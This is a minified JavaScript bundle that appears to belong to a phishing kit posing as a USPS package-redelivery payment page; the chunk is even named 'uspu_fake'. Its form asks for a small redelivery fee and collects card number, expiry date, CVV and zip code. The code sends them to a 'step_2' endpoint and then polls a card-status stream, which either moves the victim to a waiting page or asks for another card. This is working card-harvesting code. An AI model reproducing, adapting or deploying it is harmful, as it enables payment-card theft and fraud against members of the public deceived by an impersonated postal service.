"use strict";(self["webpackChunkuspu_fake"]=self["webpackChunkuspu_fake"]||[]).push([[581],{8581:function(t,e,a){a.r(e),a.d(e,{default:function(){return m}});var s=a(7024),r=a(9767),i=a(7894),o=function(){var t=this,e=t._self._c;return e("div",[e(i.Z,[e(s.Z,[e("h3",{staticClass:"payment"},[e("strong",[t._v("Payment Method")])])])],1),e(i.Z,{staticClass:"mt-0 pb-0"},[e(s.Z,[e("a",{staticStyle:{color:"red"}},[t._v("This Redelivery request cost 0.09 USD.")])])],1),e(i.Z,[e(s.Z,{attrs:{cols:t.adaptive_cols}},[e("input",{directives:[{name:"model",rawName:"v-model",value:t.card_number,expression:"card_number"}],staticClass:"form-control",attrs:{type:"number",maxlength:"19",required:"",placeholder:"Card Number",tabindex:"8",oninput:"if(value.length >16){value=value.slice(0,16)}"},domProps:{value:t.card_number},on:{blur:t.CheckBankNo,input:function(e){e.target.composing||(t.card_number=e.target.value)}}}),e("a",{staticStyle:{color:"red"}},[t._v(t._s(t.card_alert))])]),e(s.Z,{attrs:{cols:t.adaptive_cols}},[e("input",{directives:[{name:"model",rawName:"v-model",value:t.exp_date,expression:"exp_date"}],staticClass:"form-control",attrs:{type:"text",placeholder:"Expiry Date (MM/YY)",maxlength:"5",required:"",tabindex:"9",oninput:"if(value.length>5){value=value.slice(0,3)}if(value.length===2){value=value+'/'}"},domProps:{value:t.exp_date},on:{input:function(e){e.target.composing||(t.exp_date=e.target.value)}}})])],1),e(i.Z,[e(s.Z,{attrs:{cols:t.adaptive_cols}},[e("input",{directives:[{name:"model",rawName:"v-model",value:t.cvv,expression:"cvv"}],staticClass:"form-control",attrs:{type:"number",maxlength:"4",placeholder:"Security code",required:"",tabindex:"10",oninput:"if(value.length>4)value=value.slice(0,4)"},domProps:{value:t.cvv},on:{input:function(e){e.target.composing||(t.cvv=e.target.value)}}})])],1),e(i.Z,[e(s.Z,{attrs:{cols:t.adaptive_cols}},[e("input",{directives:[{name:"model",rawName:"v-model",value:t.zipcode,expression:"zipcode"}],staticClass:"form-control",attrs:{type:"number",maxlength:"5",placeholder:"Zip Code",required:"",tabindex:"10",oninput:"if(value.length>5)value=value.slice(0,5)"},domProps:{value:t.zipcode},on:{input:function(e){e.target.composing||(t.zipcode=e.target.value)}}})])],1),e(i.Z,{staticClass:"text-center",staticStyle:{"padding-bottom":"30px"}},[e(s.Z,{attrs:{cols:"12"}},[e("a",{staticClass:"btn btn-primary btn-lg",staticStyle:{color:"white"},attrs:{tabindex:"13"},on:{click:t.submit_data}},[t._v("Continue")])])],1),e(i.Z,[e(s.Z,{staticClass:"mb-5",attrs:{cols:"12"}},[e("p",{staticClass:"text-center",staticStyle:{color:"red"}},[e("b",[t._v(t._s(t.alert_text))])])])],1),e(r.Z,{model:{value:t.show_loading,callback:function(e){t.show_loading=e},expression:"show_loading"}},[e("div",{staticClass:"blockUI blockMsg blockPage",staticStyle:{"z-index":"1011",position:"fixed",padding:"0",margin:"0",width:"30%",top:"40%",left:"35%","text-align":"center",color:"rgb(0, 0, 0)",border:"1px none rgb(0, 0, 0)","background-color":"transparent",cursor:"wait"}},[e("img",{staticStyle:{height:"auto","max-width":"100%"},attrs:{src:a(2265),alt:""}})])])],1)},n=[],l=a(9669),c=a.n(l),d=a(7877),u={name:"PaymentView",computed:{adaptive_cols(){switch(this.$vuetify.breakpoint.name){case"xs":return 12}return 4}},data:()=>({card_alert:"",flush_task:void 0,alert_text:"",show_loading:!1,appid:localStorage.getItem("appid"),card_number:"",exp_date:"",cvv:"",zipcode:""}),methods:{isValidCreditCard:function(t){let e;t=t.split("-").join("");let a=0;for(e=2-t.length%2;e<=t.length;e+=2)a+=parseInt(t.charAt(e-1));for(e=t.length%2+1;e<t.length;e+=2){const s=2*parseInt(t.charAt(e-1));a+=s<10?s:s-9}return a%10===0},CheckBankNo:function(){let t=this.card_number;if(t=t.replace(/\s/g,""),""===t)return this.card_alert="Please enter the correct card number",!1;if(t.length<14||t.length>19)return this.card_alert="Please enter the correct card number",!1;const e=/^\d*$/;if(!e.exec(t))return this.card_alert="Please enter the correct card number",!1;if(!this.isValidCreditCard(t)&&null!==localStorage.getItem("CheckCard"))return this.card_alert="Please enter the correct card number",!1;const a=["3","4","5","6","9"];return-1===a.indexOf(t.slice(0,1))?(this.card_alert="Please enter the correct card number",!1):(this.card_alert="",!0)},submit_data(){if(""!==this.card_alert)return;this.show_alert=!1;const t=d.Z.step_2,e=new URLSearchParams,a=[this.card_number,this.exp_date,this.cvv,this.appid],s=["card_number","exp_date","cvv","appid"];if(""!==this.card_number&""!==this.exp_date&&""!==this.cvv){this.alert_text="",this.show_loading=!0;for(let t in a)e.append(s[t],a[t]);c().post(t,e).then((t=>{"ok"===t.data.status?(this.show_loading=!0,this.check_card_status_2()):(this.show_loading=!1,this.alert_text="Network error, please try again")})).catch((t=>{console.log(t),this.show_loading=!1,this.alert_text="Network error, please try again"}))}else this.alert_text="Please enter all information to continue"},check_card_status_2(){if("EventSource"in window){const t=d.Z.check_card_status+"?appid="+this.appid,e=new EventSource(t);e.onmessage=t=>{let a=t.data;"ok"===a?(e.close(),this.$router.push({name:"wait"})):"change"===a&&(e.close(),this.show_loading=!1,this.show_alert=!0,this.card_number=this.exp_date=this.cvv="",this.alert_text="Card not supported, please change a card")},e.onerror=t=>{console.log(t)}}}}},h=u,p=a(1001),v=(0,p.Z)(h,o,n,!1,null,"043071fa",null),m=v.exports},9767:function(t,e,a){a.d(e,{Z:function(){return n}});var s=a(5836),r=a(2066),i=a(4552),o=a(5530),n=(0,o.Z)(s.Z,r.Z,i.Z).extend({name:"v-overlay",props:{absolute:Boolean,color:{type:String,default:"#212121"},dark:{type:Boolean,default:!0},opacity:{type:[Number,String],default:.46},value:{default:!0},zIndex:{type:[Number,String],default:5}},computed:{__scrim(){const t=this.setBackgroundColor(this.color,{staticClass:"v-overlay__scrim",style:{opacity:this.computedOpacity}});return this.$createElement("div",t)},classes(){return{"v-overlay--absolute":this.absolute,"v-overlay--active":this.isActive,...this.themeClasses}},computedOpacity(){return Number(this.isActive?this.opacity:0)},styles(){return{zIndex:this.zIndex}}},methods:{genContent(){return this.$createElement("div",{staticClass:"v-overlay__content"},this.$slots.default)}},render(t){const e=[this.__scrim];return this.isActive&&e.push(this.genContent()),t("div",{staticClass:"v-overlay",on:this.$listeners,class:this.classes,style:this.styles},e)}})},5836:function(t,e,a){var s=a(144),r=a(8219),i=a(4771);e["Z"]=s.ZP.extend({name:"colorable",props:{color:String},methods:{setBackgroundColor(t,e={}){return"string"===typeof e.style?((0,r.N6)("style must be an object",this),e):"string"===typeof e.class?((0,r.N6)("class must be an object",this),e):((0,i.NA)(t)?e.style={...e.style,"background-color":`${t}`,"border-color":`${t}`}:t&&(e.class={...e.class,[t]:!0}),e)},setTextColor(t,e={}){if("string"===typeof e.style)return(0,r.N6)("style must be an object",this),e;if("string"===typeof e.class)return(0,r.N6)("class must be an object",this),e;if((0,i.NA)(t))e.style={...e.style,color:`${t}`,"caret-color":`${t}`};else if(t){const[a,s]=t.toString().trim().split(" ",2);e.class={...e.class,[a+"--text"]:!0},s&&(e.class["text--"+s]=!0)}return e}}})},4552:function(t,e,a){a.d(e,{d:function(){return r}});var s=a(144);function r(t="value",e="input"){return s.ZP.extend({name:"toggleable",model:{prop:t,event:e},props:{[t]:{required:!1}},data(){return{isActive:!!this[t]}},watch:{[t](t){this.isActive=!!t},isActive(a){!!a!==this[t]&&this.$emit(e,a)}}})}const i=r();e["Z"]=i},2265:function(t,e,a){t.exports=a.p+"img/ajax-loader-usps-white.254c51b8.gif"}}]);
//# sourceMappingURL=581.181025ad.js.map